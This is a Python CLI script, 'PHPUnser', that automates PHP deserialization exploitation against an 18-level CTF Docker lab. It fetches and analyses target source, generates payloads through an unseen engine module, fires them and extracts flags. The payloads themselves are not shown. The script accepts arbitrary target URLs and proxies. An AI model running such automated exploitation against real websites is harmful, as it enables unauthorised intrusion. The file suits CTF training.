#!/usr/bin/env python3
"""
PHPUnser — Automated PHP Deserialization Exploitation Framework
A universal CLI tool for analyzing and exploiting PHP deserialization vulnerabilities in CTF challenges.

Usage:
    phpuser --url http://target.com/level1/      # single URL
    phpuser --url http://target.com --all         # batch all 18 levels
    phpuser --url http://target.com --level 7     # specific level
    phpuser --setup                               # pull & run Docker lab
"""

import argparse
import sys
import os
import time
import textwrap
import urllib.parse
from typing import Optional

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from engine import (
    PHPSourceAnalyzer, PayloadGenerator, HTTPClient,
    extract_flags, extract_first_flag,
)

# ─── Banner ───

BANNER = r"""
  ____  _   _ ____  _   _ ____  _____ ____
 |  _ \| | | |  _ \| | | / ___|| ____|  _ \
 | |_) | |_| | |_) | | | \___ \|  _| | |_) |
 |  __/|  _  |  __/| |_| |___) | |___|  _ <
 |_|   |_| |_|_|    \___/|____/|_____|_| \_\

  PHP Deserialization Auto-Exploitation Framework
                    ~    ~
"""

# ─── Level registry ───

LAB_LEVELS = [
    (1, "Class Instantiation"), (2, "Property Assignment"), (3, "Visibility Modifiers"),
    (4, "Serialization Basics"), (5, "Serialization Rules"), (6, "Modifier Encoding"),
    (7, "Deserialization RCE"), (8, "Constructor/Destructor/GC"), (9, "Destructor Backdoor"),
    (10, "__wakeup()"), (11, "CVE-2016-7124"), (12, "__sleep()"),
    (13, "__toString()"), (14, "__invoke()"),
    (15, "POP Chain Basics"), (16, "POP Chain Construction"),
    (17, "String Escape: Create"), (18, "String Escape: Truncate"),
]


class Colors:
    RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
    BLUE = '\033[94m'; MAGENTA = '\033[95m'; CYAN = '\033[96m'
    BOLD = '\033[1m'; DIM = '\033[2m'; RESET = '\033[0m'

    @staticmethod
    def ok(s):    return f"{Colors.GREEN}{s}{Colors.RESET}"
    @staticmethod
    def fail(s):  return f"{Colors.RED}{s}{Colors.RESET}"
    @staticmethod
    def warn(s):  return f"{Colors.YELLOW}{s}{Colors.RESET}"
    @staticmethod
    def info(s):  return f"{Colors.CYAN}{s}{Colors.RESET}"
    @staticmethod
    def bold(s):  return f"{Colors.BOLD}{s}{Colors.RESET}"
    @staticmethod
    def dim(s):   return f"{Colors.DIM}{s}{Colors.RESET}"


class LevelResult:
    def __init__(self, name="", url="", success=False, flag=None, error=None):
        self.level = 0
        self.name = name
        self.url = url
        self.success = success
        self.flag = flag
        self.error = error
        self.payload_used = None
        self.response_snippet = None


class Solver:
    def __init__(self, base_url="", timeout=15, verbose=False, no_color=False):
        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        self.verbose = verbose
        self.no_color = no_color
        self.http = HTTPClient(base_url=base_url, timeout=timeout)
        self.analyzer = PHPSourceAnalyzer()
        self.generator = PayloadGenerator()
        self.results = []

    def _p(self, msg, color=None):
        if self.no_color or not color:
            print(msg)
        else:
            print(color(msg) if callable(color) else msg)

    def solve_url(self, url, level_name=""):
        if not level_name:
            level_name = url.rstrip('/').split('/')[-1] or "target"
        result = LevelResult(name=level_name, url=url)

        try:
            # Step 1: Fetch source
            self._p(f"  [1/4] Fetching source...", Colors.dim)
            source = self.http.fetch_source(url)
            if not source or len(source) < 10:
                result.error = "Failed to fetch source code"
                return result

            # Step 2: Analyze
            self._p(f"  [2/4] Analyzing ({len(source)} bytes) ...", Colors.dim)
            analysis = self.analyzer.analyze(source, url=url)
            if self.verbose:
                self._p(f"         Classes : {[c.name for c in analysis.classes]}")
                self._p(f"         Sinks   : {[s.type for s in analysis.sinks]}")
                self._p(f"         Inputs  : {[(i.method,i.name) for i in analysis.inputs]}")
                self._p(f"         Strategy: {Colors.bold(analysis.strategy)}")

            # Step 3: Generate payloads
            self._p(f"  [3/4] Generating payloads...", Colors.dim)
            payloads = self.generator.generate(analysis)
            if not payloads:
                result.error = "No payloads generated"
                return result
            self._p(f"         {len(payloads)} payload(s) prepared")

            # Step 4: Execute
            self._p(f"  [4/4] Executing exploits...", Colors.dim)
            flag = self._try_payloads(url, payloads, result)
            if flag:
                result.success = True
                result.flag = flag
            else:
                result.error = "No flag found in responses"

        except Exception as e:
            result.error = str(e)

        return result

    def solve_all(self):
        print(BANNER)
        self._p(f"  Target : {Colors.bold(self.base_url)}", Colors.info)
        self._p(f"  Levels : 1-18\n")

        for lvl_num, lvl_name in LAB_LEVELS:
            url = f"{self.base_url}/Level{lvl_num}/index.php"
            label = f"[{lvl_num:2d}] {lvl_name}"
            print(f"  {label:<50}", end=" ", flush=True)

            result = self.solve_url(url, lvl_name)
            result.level = lvl_num
            self.results.append(result)

            if result.success:
                print(Colors.ok("✓ " + (result.flag or "")[:40]))
            else:
                print(Colors.fail("✗ " + (result.error or "Failed")[:40]))
            time.sleep(0.3)

        return self.results

    def solve_level(self, num):
        url = f"{self.base_url}/Level{num}/index.php"
        return self.solve_url(url, f"Level {num}")

    def _try_payloads(self, url, payloads, result):
        tried = set()
        for payload in payloads:
            key = str(payload.data) + str(payload.params) + str(payload.cookies)
            if key in tried:
                continue
            tried.add(key)

            if self.verbose:
                desc = payload.description[:90]
                self._p(f"         ▶ {desc}", Colors.dim)

            # Send request with proper method and URL-encoding for GET
            if payload.http_method == "GET":
                get_data = payload.params if payload.params else payload.data
                resp = self.http.get(url, params=get_data)
            elif payload.http_method == "COOKIE":
                resp = self.http.get(url, cookies=payload.cookies or payload.data)
            else:
                resp = self.http.post(url, data=payload.data)

            if resp.status_code == 0:
                continue

            flag = extract_first_flag(resp.text)
            if flag:
                result.payload_used = payload.description
                result.response_snippet = resp.text[max(0, resp.text.find(flag)-40):resp.text.find(flag)+len(flag)+40]
                return flag

            # Also try detecting partial flags in the response
            text_clean = resp.text.replace('<br>', '').replace('<br/>', '').strip()
            if '{' in text_clean and '}' in text_clean and len(text_clean) < 600:
                f2 = extract_first_flag(text_clean)
                if f2:
                    result.payload_used = payload.description
                    result.response_snippet = text_clean
                    return f2

        return None

    def print_summary(self):
        if not self.results:
            return
        print(f"\n  {'─'*50}")
        ok_count = sum(1 for r in self.results if r.success)
        print(f"  Results: {Colors.ok(str(ok_count))}/{len(self.results)} solved")
        print(f"  {'─'*50}")
        for r in self.results:
            icon = Colors.ok("✓") if r.success else Colors.fail("✗")
            print(f"  {icon} L{r.level:02d}: {r.name:<45}")
            if r.flag:
                print(f"       {Colors.bold(r.flag)}")
            elif r.error:
                print(f"       {Colors.dim(r.error[:60])}")
        print(f"  {'─'*50}")

    def close(self):
        self.http.close()


# ─── CLI entry ───

def main():
    parser = argparse.ArgumentParser(
        prog='phpuser',
        description='PHPUnser — PHP Deserialization Auto-Exploitation Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            examples:
              phpuser -u http://localhost:8080/level1/       # single challenge
              phpuser -u http://localhost:8080 -a             # all 18 lab levels
              phpuser -u http://target.com/ -l 7 -v           # specific level, verbose
              phpuser --setup                                 # deploy docker lab
        """),
    )
    parser.add_argument('-u', '--url', default='http://localhost:8080',
                        help='Target base URL or full challenge path')
    parser.add_argument('-a', '--all', action='store_true',
                        help='Solve all 18 lab levels')
    parser.add_argument('-l', '--level', type=int, choices=range(1, 19),
                        help='Solve a specific level (1-18)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose output (show analysis details)')
    parser.add_argument('-t', '--timeout', type=int, default=15,
                        help='HTTP timeout in seconds (default: 15)')
    parser.add_argument('--no-color', action='store_true',
                        help='Disable colored output')
    parser.add_argument('--setup', action='store_true',
                        help='Pull and run Docker lab environment')
    parser.add_argument('--proxy', type=str, default=None,
                        help='HTTP proxy (e.g. http://127.0.0.1:8080)')

    args = parser.parse_args()

    # Setup mode
    if args.setup:
        return _docker_setup()

    # Normalize URL
    url = args.url
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    solver = Solver(base_url=url, timeout=args.timeout,
                    verbose=args.verbose, no_color=args.no_color)

    # Set proxy if requested
    if args.proxy:
        solver.http.session.proxies = {'http': args.proxy, 'https': args.proxy}

    try:
        # Connectivity check
        print(BANNER)
        print(f"  Testing {Colors.info(url)} ...", end=" ", flush=True)
        if not solver.http.test_connectivity(url):
            print(Colors.fail("UNREACHABLE"))
            print("  Hint: use --setup to deploy a local Docker lab, or check the URL.")
            return 1
        print(Colors.ok("OK\n"))

        if args.all:
            solver.solve_all()
        elif args.level:
            result = solver.solve_level(args.level)
            solver.results.append(result)
            if result.success:
                print(f"\n  {Colors.ok('SOLVED')} — {Colors.bold(result.flag)}")
            else:
                print(f"\n  {Colors.fail('FAILED')} — {result.error}")
        else:
            result = solver.solve_url(url)
            solver.results.append(result)
            if result.success:
                print(f"\n  {Colors.ok('SOLVED')} — {Colors.bold(result.flag)}")
            else:
                print(f"\n  {Colors.fail('FAILED')} — {result.error}")
                if args.verbose:
                    import traceback; traceback.print_exc()

        solver.print_summary()

    except KeyboardInterrupt:
        print("\n  Interrupted.")
    finally:
        solver.close()
    return 0


def _docker_setup():
    import subprocess
    print(BANNER)
    print("  Deploying PHPSerialize-labs Docker environment...\n")
    try:
        subprocess.run(["docker", "--version"], capture_output=True, check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("  Error: Docker is not available. Install it first.")
        return 1
    subprocess.run(["docker", "pull", "ghcr.io/probiusofficial/phpserialize-labs:latest"])
    subprocess.run(["docker", "rm", "-f", "phpserialize-labs"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "phpserialize-labs",
                    "-p", "8080:80", "ghcr.io/probiusofficial/phpserialize-labs:latest"])
    print("\n  Lab deployed at http://localhost:8080")
    print("  Run: phpuser -u http://localhost:8080 -a")
    return 0


if __name__ == '__main__':
    sys.exit(main())
